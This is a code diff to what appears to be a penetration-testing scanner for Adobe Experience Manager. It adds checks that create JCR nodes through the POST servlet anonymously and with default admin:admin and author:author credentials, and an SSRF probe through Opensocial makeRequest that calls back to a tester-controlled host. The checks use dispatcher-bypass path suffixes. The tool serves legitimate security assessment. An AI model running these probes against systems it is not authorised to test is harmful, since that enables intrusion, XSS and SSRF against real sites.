@@ -300,13 +300,62 @@ def exposed_post_servlet(base_url, my_host, debug=False, proxy=None):
 
             if resp.status_code == 200 and 'Null Operation Status:' in str(resp.content):
                 f = Finding('POSTServlet', url,
-                            'POSTServlet is exposed, stored XSS might be possible. '
-                            'Usually node "/content/usergenerated/etc/commerce/smartlists" is wrirable (jcr:write) by anonymous user.')
+                            'POSTServlet is exposed, persistent XSS or RCE might be possible, it depends on your privileges.')
                 results.append(f)
                 break
         except:
             if debug:
                 error('Exception while performing a check', check='exposed_post_servlet', url=url)
+
+    return results
+
+
+@register
+def create_new_nodes(base_url, my_host, debug=False, proxy=None):
+    CREDS = ('admin:admin', 'author:author')
+
+    POSTSERVLET = itertools.product(('/content/test', '/content/*', '/content/usergenerated/test', '/content/usergenerated/*',
+                                     '/content/usergenerated/etc/commerce/smartlists/test', '/content/usergenerated/etc/commerce/smartlists/*',
+                                     '/apps/test', '/apps/*'),
+                                    ('.json', '.1.json', '.json/a.css', '.json/a.html', '.json/a.ico', '.json/a.png',
+                                     '.json/a.gif', '.json/a.1.json', '.json;%0aa.css', '.json;%0aa.html', '.json;%0aa.js',
+                                     '.json;%0aa.png', '.json;%0aa.ico', '.4.2.1...json'))
+    POSTSERVLET = list('{0}{1}'.format(p1, p2) for p1, p2 in POSTSERVLET)
+
+    results = []
+    for path in POSTSERVLET:
+        url = normalize_url(base_url, path)
+        try:
+            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': base_url}
+            resp = http_request(url, 'POST', additional_headers=headers, proxy=proxy)
+
+            if resp.status_code == 200 and '<td>Parent Location</td>' in str(resp.content):
+                f = Finding('CreateJCRNodes', url,
+                            'It\'s possible to create new JCR nodes using POST Servlet. As anonymous user. '
+                            'You might get persistent XSS.')
+                results.append(f)
+                break
+        except:
+            if debug:
+                error('Exception while performing a check', check='create_new_nodes', url=url)
+
+
+    for path, creds in itertools.product(POSTSERVLET, CREDS):
+        url = normalize_url(base_url, path)
+        try:
+            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': base_url,
+                       'Authorization': 'Basic {}'.format(base64.b64encode(creds.encode()).decode())}
+            resp = http_request(url, 'POST', additional_headers=headers, proxy=proxy)
+
+            if resp.status_code == 200 and '<td>Parent Location</td>' in str(resp.content):
+                f = Finding('CreateJCRNodes', url,
+                            'It\'s possible to create new JCR nodes using POST Servlet as "{0}" user. '
+                            'You might get persistent XSS or RCE.'.format(creds))
+                results.append(f)
+                break
+        except:
+            if debug:
+                error('Exception while performing a check', check='create_new_nodes', url=url)
 
     return results
 
@@ -939,9 +988,7 @@ def ssrf_opensocial_proxy(base_url, my_host, debug=False, proxy=None):
     OPENSOCIAL1 = itertools.product(
         (
             '/libs/opensocial/proxy{0}?container=default&url={{0}}',
-            '/libs/shindig/proxy{0}?container=default&url={{0}}',
-            '///libs///opensocial///proxy{0}?container=default&url={{0}}',
-            '///libs///shindig///proxy{0}?container=default&url={{0}}'
+            '///libs///opensocial///proxy{0}?container=default&url={{0}}'
         ),
         (
             '', '.json', '.1.json', '.4.2.1...json', '.html'
@@ -952,9 +999,7 @@ def ssrf_opensocial_proxy(base_url, my_host, debug=False, proxy=None):
     OPENSOCIAL2 = itertools.product(
         (
             '/libs/opensocial/proxy{0}?container=default&url={{0}}',
-            '/libs/shindig/proxy{0}?container=default&url={{0}}',
-            '///libs///opensocial///proxy{0}?container=default&url={{0}}',
-            '///libs///shindig///proxy{0}?container=default&url={{0}}'
+            '///libs///opensocial///proxy{0}?container=default&url={{0}}'
         ),
         (
            '/{0}.1.json', '/{0}.4.2.1...json', '/{0}.css', '/{0}.js', '/{0}.png', '/{0}.bmp', ';%0a{0}.css', ';%0a{0}.js',
@@ -967,9 +1012,7 @@ def ssrf_opensocial_proxy(base_url, my_host, debug=False, proxy=None):
     OPENSOCIAL3 = itertools.product(
         (
             '/libs/opensocial/proxy{0}?container=default&url={{0}}',
-            '/libs/shindig/proxy{0}?container=default&url={{0}}',
-            '///libs///opensocial///proxy{0}?container=default&url={{0}}',
-            '///libs///shindig///proxy{0}?container=default&url={{0}}'
+            '///libs///opensocial///proxy{0}?container=default&url={{0}}'
         ),
         (
             '.{0}.css', '.{0}.js', '.{0}.png', '.{0}.ico', '.{0}.bmp', '.{0}.gif', '.{0}.html'
@@ -1004,6 +1047,74 @@ def ssrf_opensocial_proxy(base_url, my_host, debug=False, proxy=None):
 
 
 @register
+def ssrf_opensocial_makeRequest(base_url, my_host, debug=False, proxy=None):
+    global token, d
+
+    results = []
+
+    MAKEREQUEST1 = itertools.product(
+        (
+            '/libs/opensocial/makeRequest{0}?url={{0}}',
+            '///libs///opensocial///makeRequest{0}?url={{0}}'
+        ),
+        (
+            '', '.json', '.1.json', '.4.2.1...json', '.html'
+        )
+    )
+    MAKEREQUEST1 = list(pair[0].format(pair[1]) for pair in MAKEREQUEST1)
+
+    MAKEREQUEST2 = itertools.product(
+        (
+            '/libs/opensocial/makeRequest{0}?url={{0}}',
+            '///libs///opensocial///makeRequest{0}?url={{0}}'
+        ),
+        (
+           '/{0}.1.json', '/{0}.4.2.1...json', '/{0}.css', '/{0}.js', '/{0}.png', '/{0}.bmp', ';%0a{0}.css', ';%0a{0}.js',
+           ';%0a{0}.png', ';%0a{0}.html', ';%0a{0}.ico', ';%0a{0}.png', '/{0}.ico', './{0}.html'
+        )
+    )
+    cache_buster = random_string()
+    MAKEREQUEST2 = list(pair[0].format(pair[1].format(cache_buster)) for pair in MAKEREQUEST2)
+
+    MAKEREQUEST3 = itertools.product(
+        (
+            '/libs/opensocial/makeRequest{0}?url={{0}}',
+            '///libs///opensocial///makeRequest{0}?url={{0}}'
+        ),
+        (
+            '.{0}.css', '.{0}.js', '.{0}.png', '.{0}.ico', '.{0}.bmp', '.{0}.gif', '.{0}.html'
+        )
+    )
+    cache_buster = randint(1, 2**12)
+    MAKEREQUEST3 = list(pair[0].format(pair[1].format(cache_buster)) for pair in MAKEREQUEST3)
+
+    for path in itertools.chain(MAKEREQUEST1, MAKEREQUEST2, MAKEREQUEST3):
+        url = normalize_url(base_url, path)
+        encoded_orig_url = (base64.b16encode(url.encode())).decode()
+        back_url = 'http://{0}/{1}/opensocialmakerequest/{2}/'.format(my_host, token, encoded_orig_url)
+        url = url.format(back_url)
+
+        try:
+            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': base_url}
+            data = 'httpMethod=GET'
+            http_request(url, 'POST', data=data, additional_headers=headers, proxy=proxy)
+        except:
+            if debug:
+                error('Exception while performing a check', check='ssrf_opensocial_makeRequest', url=url)
+
+    time.sleep(10)
+
+    if 'opensocialmakerequest' in d:
+        u = base64.b16decode(d.get('opensocialmakerequest')[0]).decode()
+        f = Finding('Opensocial (shindig) makeRequest', u,
+                    'SSRF via Opensocial (shindig) makeRequest. Yon can specify parameters httpMethod, postData, headers, contentType for makeRequest.')
+
+        results.append(f)
+
+    return results
+
+
+@register
 def swf_xss(base_url, my_host, debug=False, proxy=None):
     SWFS = (
         '/etc/clientlibs/foundation/video/swf/player_flv_maxi.swf?onclick=javascript:confirm(document.domain)',
@@ -1031,7 +1142,8 @@ def swf_xss(base_url, my_host, debug=False, proxy=None):
             resp = http_request(url, proxy=proxy)
 
             ct = content_type(resp.headers.get('Content-Type', ''))
-            if resp.status_code == 200 and ct == 'application/x-shockwave-flash':
+            cd = resp.headers.get('Content-Disposition', '')
+            if resp.status_code == 200 and ct == 'application/x-shockwave-flash' and not cd:
                 f = Finding('Reflected XSS via SWF', url,
                             'AEM exposes SWF that might be vulnerable to reflected XSS. '
                             'See - https://speakerdeck.com/fransrosen/a-story-of-the-passive-aggressive-sysadmin-of-aem?slide=61')
@@ -1078,7 +1190,7 @@ def deser_externaljob_servlet(base_url, my_host, debug=False, proxy=None):
 
 @register
 def exposed_webdav(base_url, my_host, debug=False, proxy=None):
-    WEBDAV = itertools.product(('/crx/repository/test', ),
+    WEBDAV = itertools.product(('/crx/repository/test.sh', ),
                                            ('', '.json', '.css', '.js', '.html', '.ico', '.png', '.gif',
                                             ';%0aa.css', ';%0aa.js', ';%0aa.html', ';%0aa.ico', ';%0aa.png',
                                             '/a.css', '/a.html', '/a.js', '/a.ico', '/a.png', '/a.ico'))
@@ -1238,7 +1350,7 @@ def parse_args():
     parser.add_argument('--debug', action='store_true', help='debug output')
     parser.add_argument('--host', help='hostname or IP to use for back connections during SSRF detection')
     parser.add_argument('--port', type=int, default=80, help='opens port for SSRF detection')
-    parser.add_argument('--workers', type=int, default=5, help='number of parallel workers')
+    parser.add_argument('--workers', type=int, default=3, help='number of parallel workers')
 
     return parser.parse_args(sys.argv[1:])
 
@@ -1265,7 +1377,7 @@ def main():
         proxy = {}
 
     if not args.url:
-        print('You must specify the --url parameter, bye.')
+        print('You must specify the -u parameter, bye.')
         sys.exit(1337)
 
     if not args.host:
